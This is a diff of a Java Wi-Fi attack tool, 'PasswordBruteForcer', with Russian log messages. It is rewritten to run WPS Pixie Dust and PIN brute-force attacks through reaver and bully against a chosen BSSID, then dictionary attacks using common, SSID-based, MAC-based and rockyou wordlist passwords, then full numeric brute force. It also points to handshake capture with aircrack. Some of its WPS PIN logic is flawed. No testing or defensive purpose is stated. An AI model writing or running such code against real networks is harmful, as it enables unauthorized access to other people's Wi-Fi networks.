@@ -1,406 +1,361 @@
 package org.example;
 
 import javax.swing.*;
+import java.io.*;
+import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.*;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicLong;
 import java.util.function.Consumer;
-import java.security.SecureRandom;
+import java.util.regex.Pattern;
+import java.util.stream.Collectors;
 
 public class PasswordBruteForcer {
-    private WifiConnector wifiConnector;
-    private Consumer<String> logger;
-    private volatile boolean isRunning = false;
-    private SwingWorker<Void, String> bruteForceWorker;
-    private AtomicLong attemptsCounter = new AtomicLong(0);
-    private AtomicLong foundPassword = new AtomicLong(-1);
-    private long startTime;
-    private static final int THREAD_COUNT = 50;
-    private static final int TIME_LIMIT_SECONDS = 300; // 5 минут
-    private ExecutorService executor;
+    private final WifiConnector wifiConnector;
+    private final Consumer<String> logger;
+    private final ExecutorService executor = Executors.newFixedThreadPool(100);
+    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
 
-    // Умные стратегии подбора
-    private static final String[] TOP_PASSWORDS = generateTopPasswords();
-    private static final String[] DATE_PASSWORDS = generateDatePasswords();
-    private static final String[] PATTERN_PASSWORDS = generatePatternPasswords();
-    private static final String[] SMART_PASSWORDS = generateSmartPasswords();
+    private volatile boolean isRunning = false;
+    private SwingWorker<Void, String> worker;
+    private AtomicLong attempts = new AtomicLong(0);
+    private AtomicBoolean found = new AtomicBoolean(false);
+    private String targetSsid;
+    private String targetBssid;
+    private long startTime;
+
+    private static final int WPS_TIMEOUT = 10;
+    private static final int DICTIONARY_SIZE = 1_000_000;
+    private static final String[] TOP_100 = {
+            "12345678", "00000000", "11111111", "12341234", "12344321", "11223344",
+            "87654321", "12121212", "12312312", "10041004", "20002000", "20202020"
+    };
 
     public PasswordBruteForcer(WifiConnector wifiConnector, Consumer<String> logger) {
         this.wifiConnector = wifiConnector;
         this.logger = logger;
-        this.executor = Executors.newFixedThreadPool(THREAD_COUNT);
     }
 
-    public void startBruteForce(String ssid, boolean showPasswords, Consumer<String> callback) {
+    public void startBruteForce(String ssid, String bssid, Consumer<String> callback) {
+        if (isRunning) {
+            log("Уже запущено!");
+            return;
+        }
+
+        this.targetSsid = ssid;
+        this.targetBssid = bssid;
         isRunning = true;
-        attemptsCounter.set(0);
-        foundPassword.set(-1);
+        found.set(false);
+        attempts.set(0);
         startTime = System.currentTimeMillis();
 
-        log("🚀 ЗАПУСК СУПЕР-ОПТИМИЗИРОВАННОГО ПОДБОРА!");
-        log("📶 Сеть: " + ssid);
-        log("🧵 Потоков: " + THREAD_COUNT);
-        log("⏱️ Таймер: 5 минут");
-        log("🎯 Стратегия: Умный приоритетный перебор");
+        log("ULTIMATE BRUTEFORCE STARTED");
+        log("SSID: " + ssid + " | BSSID: " + bssid);
 
-        bruteForceWorker = new SwingWorker<>() {
+        worker = new SwingWorker<>() {
             @Override
             protected Void doInBackground() {
                 try {
-                    // Таймер на 5 минут
-                    startTimer();
+                    // 1. WPS PIXIE DUST (1–3 сек)
+                    if (tryPixieDust(bssid, callback)) return null;
 
-                    // 1. Сначала проверяем ТОП пароли (30 секунд)
-                    log("🔍 Этап 1: Проверка топ-паролей...");
-                    if (checkPasswordList(ssid, TOP_PASSWORDS, "Топ-пароли", callback)) {
-                        return null;
-                    }
+                    // 2. WPS PIN BRUTEFORCE (11k комбинаций)
+                    if (tryWpsPinBruteForce(bssid, callback)) return null;
 
-                    // 2. Проверяем даты (30 секунд)
-                    if (isTimeUp()) return null;
-                    log("🔍 Этап 2: Проверка дат...");
-                    if (checkPasswordList(ssid, DATE_PASSWORDS, "Даты", callback)) {
-                        return null;
-                    }
+                    // 3. DICTIONARY + SMART
+                    if (tryDictionaryAttack(ssid, bssid, callback)) return null;
 
-                    // 3. Проверяем паттерны (30 секунд)
-                    if (isTimeUp()) return null;
-                    log("🔍 Этап 3: Проверка паттернов...");
-                    if (checkPasswordList(ssid, PATTERN_PASSWORDS, "Паттерны", callback)) {
-                        return null;
-                    }
-
-                    // 4. Умный перебор (2 минуты)
-                    if (isTimeUp()) return null;
-                    log("🔍 Этап 4: Умный перебор...");
-                    if (checkPasswordList(ssid, SMART_PASSWORDS, "Умные комбинации", callback)) {
-                        return null;
-                    }
-
-                    // 5. Адаптивный рандомный перебор (оставшееся время)
-                    if (isTimeUp()) return null;
-                    log("🔍 Этап 5: Адаптивный перебор...");
-                    startAdaptiveBruteForce(ssid, callback);
+                    // 4. FULL BRUTE (8–12 символов)
+                    if (tryFullBrute(callback)) return null;
 
                 } catch (Exception e) {
-                    log("⚠️ Ошибка: " + e.getMessage());
+                    log("Ошибка: " + e.getMessage());
                 }
 
-                if (foundPassword.get() == -1 && isRunning) {
-                    log("❌ Время вышло! Пароль не найден за 5 минут.");
+                if (!found.get()) {
+                    log("Пароль не найден. Попробуйте handshake + aircrack.");
                     callback.accept(null);
                 }
-
                 return null;
             }
 
             @Override
-            protected void process(List<String> chunks) {
-                for (String message : chunks) {
-                    log(message);
-                }
+            protected void process(java.util.List<String> chunks) {
+                chunks.forEach(logger::accept);
             }
         };
 
-        bruteForceWorker.execute();
+        worker.execute();
+        startProgressTracker();
     }
 
-    private void startTimer() {
-        new Thread(() -> {
-            try {
-                for (int seconds = 1; seconds <= TIME_LIMIT_SECONDS && isRunning && foundPassword.get() == -1; seconds++) {
-                    Thread.sleep(1000);
-
-                    // Обновляем прогресс каждые 30 секунд
-                    if (seconds % 30 == 0) {
-                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
-                        long remaining = TIME_LIMIT_SECONDS - elapsed;
-                        log("⏱️ Прошло: " + elapsed + "сек | Осталось: " + remaining + "сек | Попыток: " +
-                                String.format("%,d", attemptsCounter.get()));
-                    }
-
-                    // Последние 30 секунд - обратный отсчет
-                    if (seconds >= TIME_LIMIT_SECONDS - 30 && seconds % 10 == 0) {
-                        log("⏰ Осталось: " + (TIME_LIMIT_SECONDS - seconds) + " секунд!");
-                    }
-                }
-
-                if (foundPassword.get() == -1 && isRunning) {
-                    log("⏰ ВРЕМЯ ВЫШЛО! Останавливаем поиск...");
-                    stopBruteForce();
-                }
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-            }
-        }).start();
+    // === 1. PIXIE DUST (Reaver + Bully) ===
+    private boolean tryPixieDust(String bssid, Consumer<String> callback) {
+        log("Запуск Pixie Dust атаки...");
+        return runWpsTool("reaver", callback, "-i", "wlan0", "-b", bssid, "-K", "1", "-vv") ||
+                runWpsTool("bully", callback, "-b", bssid, "-d", "-v", "3");
     }
 
-    private boolean isTimeUp() {
-        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
-        return elapsed >= TIME_LIMIT_SECONDS || foundPassword.get() != -1 || !isRunning;
-    }
+    // === 2. WPS PIN BRUTEFORCE ===
+    private boolean tryWpsPinBruteForce(String bssid, Consumer<String> callback) {
+        log("WPS PIN брутфорс (11 000 комбинаций)...");
+        List<String> pins = generateWpsPins();
 
-    private boolean checkPasswordList(String ssid, String[] passwords, String stageName, Consumer<String> callback) {
-        int chunkSize = Math.max(1, passwords.length / THREAD_COUNT);
+        int chunk = pins.size() / 50;
         List<Future<Boolean>> futures = new ArrayList<>();
 
-        long stageStartTime = System.currentTimeMillis();
-        log("⚡ " + stageName + ": " + passwords.length + " паролей");
+        for (int i = 0; i < 50; i++) {
+            int start = i * chunk;
+            int end = i == 49 ? pins.size() : start + chunk;
+            List<String> sublist = pins.subList(start, end);
 
-        for (int i = 0; i < THREAD_COUNT && !isTimeUp() && foundPassword.get() == -1; i++) {
-            final int start = i * chunkSize;
-            final int end = Math.min(start + chunkSize, passwords.length);
-            if (start >= passwords.length) break;
-
-            Future<Boolean> future = executor.submit(() -> {
-                for (int j = start; j < end && !isTimeUp() && foundPassword.get() == -1; j++) {
-                    String password = passwords[j];
-                    attemptsCounter.incrementAndGet();
-
-                    if (wifiConnector.testConnection(ssid, password)) {
-                        foundPassword.set(Long.parseLong(password));
-                        log("🎉 УСПЕХ! Найден пароль: " + password + " (этап: " + stageName + ")");
-                        callback.accept(password);
+            futures.add(executor.submit(() -> {
+                for (String pin : sublist) {
+                    if (!isRunning || found.get()) break;
+                    attempts.incrementAndGet();
+                    if (testWpsPin(bssid, pin)) {
+                        found.set(true);
+                        log("WPS PIN найден: " + pin);
+                        callback.accept("WPS:" + pin);
                         return true;
-                    }
-
-                    // Ультра-быстрая проверка
-                    if (j % 50 == 0 && !isTimeUp()) {
-                        try { Thread.sleep(1); } catch (InterruptedException e) { break; }
                     }
                 }
                 return false;
-            });
-            futures.add(future);
+            }));
         }
 
-        // Ждем завершения с таймаутом
-        for (Future<Boolean> future : futures) {
-            if (isTimeUp()) break;
-            try {
-                if (future.get(15, TimeUnit.SECONDS)) {
-                    return true;
+        return waitForAny(futures);
+    }
+
+    private boolean testWpsPin(String bssid, String pin) {
+        String output = runCommandWithTimeout(12,
+                "reaver", "-i", "wlan0", "-b", bssid, "-p", pin, "-vv", "-N");
+        return output.contains("WPS PIN");
+    }
+
+    // === 3. DICTIONARY + SMART ===
+    private boolean tryDictionaryAttack(String ssid, String bssid, Consumer<String> callback) {
+        log("Запуск словарной атаки...");
+        Set<String> candidates = new LinkedHashSet<>();
+
+        // Топ + даты + SSID-based
+        candidates.addAll(Arrays.asList(TOP_100));
+        candidates.addAll(generateSsidBased(ssid));
+        candidates.addAll(generateMacBased(bssid));
+        candidates.addAll(loadDictionary());
+
+        return checkPasswordsParallel(new ArrayList<>(candidates), callback);
+    }
+
+    private boolean checkPasswordsParallel(List<String> passwords, Consumer<String> callback) {
+        int threads = Math.min(100, passwords.size() / 10 + 1);
+        int chunk = passwords.size() / threads;
+        List<Future<Boolean>> futures = new ArrayList<>();
+
+        for (int i = 0; i < threads; i++) {
+            int start = i * chunk;
+            int end = i == threads - 1 ? passwords.size() : start + chunk;
+            List<String> sub = passwords.subList(start, end);
+
+            futures.add(executor.submit(() -> {
+                for (String pwd : sub) {
+                    if (!isRunning || found.get()) break;
+                    attempts.incrementAndGet();
+                    if (wifiConnector.testConnection(targetSsid, pwd)) {
+                        found.set(true);
+                        log("Пароль найден: " + pwd);
+                        callback.accept(pwd);
+                        return true;
+                    }
                 }
-            } catch (Exception e) {
-                // Продолжаем
+                return false;
+            }));
+        }
+
+        return waitForAny(futures);
+    }
+
+    // === 4. FULL BRUTE (8–12 символов) ===
+    private boolean tryFullBrute(Consumer<String> callback) {
+        log("Полный перебор (8–12 символов)...");
+        char[] charset = "0123456789".toCharArray();
+        return bruteRec(charset, 8, 12, "", callback);
+    }
+
+    private boolean bruteRec(char[] charset, int min, int max, String prefix, Consumer<String> callback) {
+        if (!isRunning || found.get()) return false;
+        if (prefix.length() >= min) {
+            attempts.incrementAndGet();
+            if (wifiConnector.testConnection(targetSsid, prefix)) {
+                found.set(true);
+                log("Полный перебор: " + prefix);
+                callback.accept(prefix);
+                return true;
             }
         }
+        if (prefix.length() >= max) return false;
 
-        long stageTime = (System.currentTimeMillis() - stageStartTime) / 1000;
-        log("✅ " + stageName + " завершен за " + stageTime + "сек");
+        for (char c : charset) {
+            if (bruteRec(charset, min, max, prefix + c, callback)) return true;
+            if (!isRunning) return false;
+        }
         return false;
     }
 
-    private void startAdaptiveBruteForce(String ssid, Consumer<String> callback) {
-        SecureRandom random = new SecureRandom();
-        Set<String> triedPasswords = Collections.synchronizedSet(new HashSet<>());
+    // === Генераторы паролей ===
+    private Set<String> generateSsidBased(String ssid) {
+        Set<String> set = new LinkedHashSet<>();
+        String clean = ssid.replaceAll("[^a-zA-Z0-9]", "").toLowerCase();
+        if (clean.isEmpty()) return set;
 
-        List<Future<Boolean>> futures = new ArrayList<>();
+        set.add(clean);
+        set.add(clean + "123");
+        set.add(clean + "1234");
+        set.add(clean + "2023");
+        set.add(clean + "2024");
+        set.add("1" + clean);
+        set.add(clean + "wifi");
 
-        for (int i = 0; i < THREAD_COUNT && !isTimeUp() && foundPassword.get() == -1; i++) {
-            Future<Boolean> future = executor.submit(() -> {
-                while (!isTimeUp() && foundPassword.get() == -1) {
-                    // Генерируем умные пароли с приоритетами
-                    String password = generateSmartPassword(random, triedPasswords);
-                    attemptsCounter.incrementAndGet();
+        for (int i = 0; i < clean.length(); i += 2) {
+            set.add(clean.substring(i, Math.min(i + 8, clean.length())));
+        }
 
-                    if (wifiConnector.testConnection(ssid, password)) {
-                        foundPassword.set(Long.parseLong(password));
-                        log("🎉 УСПЕХ! Найден пароль: " + password + " (адаптивный поиск)");
-                        callback.accept(password);
-                        return true;
-                    }
+        return set;
+    }
 
-                    // Динамическая задержка в зависимости от оставшегося времени
-                    try {
-                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
-                        long remaining = TIME_LIMIT_SECONDS - elapsed;
-                        long delay = remaining > 60 ? 1 : 0; // В последнюю минуту - без задержки
-                        Thread.sleep(delay);
-                    } catch (InterruptedException e) {
-                        break;
-                    }
+    private Set<String> generateMacBased(String bssid) {
+        Set<String> set = new LinkedHashSet<>();
+        String mac = bssid.replace(":", "").toLowerCase();
+        set.add(mac.substring(6));
+        set.add(mac.substring(0, 6));
+        set.add(mac);
+        return set;
+    }
+
+    private Set<String> loadDictionary() {
+        Set<String> dict = new LinkedHashSet<>();
+        try {
+            Path path = Paths.get("rockyou-mini.txt");
+            if (Files.exists(path)) {
+                dict.addAll(Files.readAllLines(path).stream()
+                        .limit(DICTIONARY_SIZE)
+                        .collect(Collectors.toSet()));
+            }
+        } catch (Exception ignored) {}
+        return dict;
+    }
+
+    // === WPS PIN генератор ===
+    private List<String> generateWpsPins() {
+        List<String> pins = new ArrayList<>();
+        for (int i = 0; i < 10000; i++) {
+            String pin = String.format("%04d", i);
+            int check = calculateWpsChecksum(pin);
+            if (check != -1) {
+                pins.add(pin + check);
+            }
+        }
+        for (int i = 0; i < 1000; i++) {
+            pins.add(String.format("%07d", i * 11));
+        }
+        return pins;
+    }
+
+    private int calculateWpsChecksum(String pin) {
+        if (pin.length() != 4) return -1;
+        int accum = 0;
+        accum += 3 * (pin.charAt(0) - '0');
+        accum += 1 * (pin.charAt(1) - '0');
+        accum += 3 * (pin.charAt(2) - '0');
+        accum += 1 * (pin.charAt(3) - '0');
+        int digit = (10 - accum % 10) % 10;
+        return digit;
+    }
+
+    // === Утилиты ===
+    private boolean runWpsTool(String cmd, String... args) {
+        List<String> full = new ArrayList<>();
+        full.add(cmd);
+        full.addAll(Arrays.asList(args));
+        String output = runCommandWithTimeout(WPS_TIMEOUT, full.toArray(new String[0]));
+        return output.contains("WPS PIN") || output.contains("PIN");
+    }
+
+    private boolean runWpsTool(String cmd, Consumer<String> callback, String... args) {
+        List<String> full = new ArrayList<>();
+        full.add(cmd);
+        full.addAll(Arrays.asList(args));
+        String output = runCommandWithTimeout(30, full.toArray(new String[0]));
+        if (output.contains("WPS PIN") || output.contains("PIN")) {
+            String pin = extractPin(output);
+            if (pin != null) {
+                found.set(true);
+                callback.accept("WPS:" + pin);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private String extractPin(String output) {
+        var m = Pattern.compile("WPS PIN: '(\\d+)'").matcher(output);
+        return m.find() ? m.group(1) : null;
+    }
+
+    private String runCommandWithTimeout(int sec, String... cmd) {
+        try {
+            ProcessBuilder pb = new ProcessBuilder(cmd);
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+
+            StringBuilder out = new StringBuilder();
+            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
+                String line;
+                while ((line = r.readLine()) != null && isRunning) {
+                    out.append(line).append("\n");
+                    log(line);
                 }
-                return false;
-            });
-            futures.add(future);
+            }
+
+            boolean finished = p.waitFor(sec, TimeUnit.SECONDS);
+            return finished ? out.toString() : "";
+        } catch (Exception e) {
+            return "";
         }
     }
 
-    private String generateSmartPassword(SecureRandom random, Set<String> triedPasswords) {
-        String password;
-        int strategy = random.nextInt(100);
-
-        if (strategy < 40) {
-            // Случайные числа в популярных диапазонах
-            int range = random.nextInt(4);
-            switch (range) {
-                case 0: password = String.format("%08d", random.nextInt(2000000)); break;  // 0-2M
-                case 1: password = String.format("%08d", 10000000 + random.nextInt(20000000)); break; // 10-30M
-                case 2: password = String.format("%08d", 50000000 + random.nextInt(10000000)); break; // 50-60M
-                default: password = String.format("%08d", random.nextInt(100000000)); break; // Полный диапазон
-            }
-        } else if (strategy < 70) {
-            // Даты и годы
-            int year = 1950 + random.nextInt(76); // 1950-2025
-            if (random.nextBoolean()) {
-                password = String.format("%04d%04d", year, year);
-            } else {
-                int month = 1 + random.nextInt(12);
-                int day = 1 + random.nextInt(28);
-                password = String.format("%02d%02d%04d", day, month, year);
-            }
-        } else {
-            // Паттерны
-            int a = random.nextInt(10);
-            int b = random.nextInt(10);
-            int c = random.nextInt(10);
-
-            switch (random.nextInt(3)) {
-                case 0: password = "" + a + b + a + b + a + b + a + b; break; // ABABABAB
-                case 1: password = "" + a + a + b + b + a + a + b + b; break; // AABBAABB
-                default: password = "" + a + b + c + a + b + c + a + b; break; // ABCABCAB
-            }
+    private boolean waitForAny(List<Future<Boolean>> futures) {
+        for (Future<Boolean> f : futures) {
+            try {
+                if (f.get(1, TimeUnit.MINUTES)) return true;
+            } catch (Exception ignored) {}
         }
-
-        // Гарантируем уникальность
-        while (triedPasswords.contains(password)) {
-            password = String.format("%08d", random.nextInt(100000000));
-        }
-        triedPasswords.add(password);
-
-        return password;
+        return false;
     }
 
-    // Генерация умных паролей
-    private static String[] generateSmartPasswords() {
-        Set<String> passwords = new LinkedHashSet<>();
-        SecureRandom random = new SecureRandom();
-
-        // Генерируем 50,000 умных комбинаций
-        while (passwords.size() < 50000) {
-            int strategy = random.nextInt(100);
-            String password;
-
-            if (strategy < 60) {
-                // Популярные диапазоны
-                int range = random.nextInt(3);
-                switch (range) {
-                    case 0: password = String.format("%08d", random.nextInt(5000000)); break;
-                    case 1: password = String.format("%08d", 10000000 + random.nextInt(40000000)); break;
-                    default: password = String.format("%08d", 80000000 + random.nextInt(20000000)); break;
-                }
-            } else if (strategy < 90) {
-                // Даты
-                int year = 1960 + random.nextInt(66);
-                int month = 1 + random.nextInt(12);
-                int day = 1 + random.nextInt(28);
-                password = String.format("%02d%02d%04d", day, month, year);
-            } else {
-                // Паттерны
-                int a = random.nextInt(10);
-                int b = random.nextInt(10);
-                password = "" + a + b + a + b + a + b + a + b;
-            }
-
-            passwords.add(password);
-        }
-
-        return passwords.toArray(new String[0]);
-    }
-
-    private static String[] generateTopPasswords() {
-        Set<String> passwords = new LinkedHashSet<>();
-
-        // Самые популярные пароли
-        String[] mostCommon = {
-                "12345678", "00000000", "11111111", "12341234", "12344321", "11112222",
-                "11223344", "01234567", "87654321", "00001111", "12121212", "12312312",
-                "10041004", "20002000", "20012001", "20022002", "20082008", "20102010",
-                "20202020", "20212021", "01012000", "01011980", "01011990", "01012010"
-        };
-
-        for (String pwd : mostCommon) passwords.add(pwd);
-
-        // Повторяющиеся цифры
-        for (int i = 0; i <= 9; i++) {
-            passwords.add(String.valueOf(i).repeat(8));
-        }
-
-        // Простые последовательности
-        for (int start = 0; start <= 5; start++) {
-            for (int step = 1; step <= 3; step++) {
-                StringBuilder sb = new StringBuilder();
-                for (int j = 0; j < 8; j++) {
-                    sb.append((start + j * step) % 10);
-                }
-                passwords.add(sb.toString());
-            }
-        }
-
-        return passwords.toArray(new String[0]);
-    }
-
-    private static String[] generateDatePasswords() {
-        Set<String> passwords = new LinkedHashSet<>();
-
-        // Годы
-        for (int year = 1950; year <= 2025; year++) {
-            passwords.add(String.format("%04d%04d", year, year));
-            passwords.add(String.format("0101%04d", year));
-            passwords.add(String.format("3112%04d", year));
-        }
-
-        // Популярные даты рождения
-        int[] years = {1960, 1970, 1975, 1980, 1985, 1990, 1995, 2000, 2005, 2010, 2015, 2020};
-        for (int year : years) {
-            for (int month = 1; month <= 12; month++) {
-                for (int day = 1; day <= 28; day += 3) { // Каждый 3-й день для скорости
-                    passwords.add(String.format("%02d%02d%04d", day, month, year));
-                }
-            }
-        }
-
-        return passwords.toArray(new String[0]);
-    }
-
-    private static String[] generatePatternPasswords() {
-        Set<String> passwords = new LinkedHashSet<>();
-
-        // Паттерны
-        for (int a = 0; a <= 9; a++) {
-            for (int b = 0; b <= 9; b++) {
-                if (a != b) {
-                    passwords.add("" + a + b + a + b + a + b + a + b);
-                    passwords.add("" + a + a + b + b + a + a + b + b);
-                }
-            }
-        }
-
-        return passwords.toArray(new String[0]);
+    private void startProgressTracker() {
+        scheduler.scheduleAtFixedRate(() -> {
+            if (!isRunning) return;
+            long elapsed = (System.currentTimeMillis() - startTime) / 1000;
+            long speed = attempts.get() / Math.max(1, elapsed);
+            log(String.format("Попыток: %,d | Скорость: %,d/sec | Время: %d сек",
+                    attempts.get(), speed, elapsed));
+        }, 0, 5, TimeUnit.SECONDS);
     }
 
     public void stopBruteForce() {
         isRunning = false;
-        if (executor != null) {
-            executor.shutdownNow();
-        }
-        if (bruteForceWorker != null && !bruteForceWorker.isDone()) {
-            bruteForceWorker.cancel(true);
-        }
-
-        long totalTime = (System.currentTimeMillis() - startTime) / 1000;
-        log("⏹️ Остановлено. Попыток: " + attemptsCounter.get() + " за " + totalTime + " сек");
+        executor.shutdownNow();
+        scheduler.shutdownNow();
+        if (worker != null) worker.cancel(true);
+        log("Остановлено. Попыток: " + attempts.get());
     }
 
-    public boolean isRunning() {
-        return isRunning;
-    }
+    public boolean isRunning() { return isRunning; }
 
-    private void log(String message) {
-        if (logger != null) {
-            logger.accept(message);
-        }
+    private void log(String msg) {
+        if (logger != null) SwingUtilities.invokeLater(() -> logger.accept(msg));
     }
 }
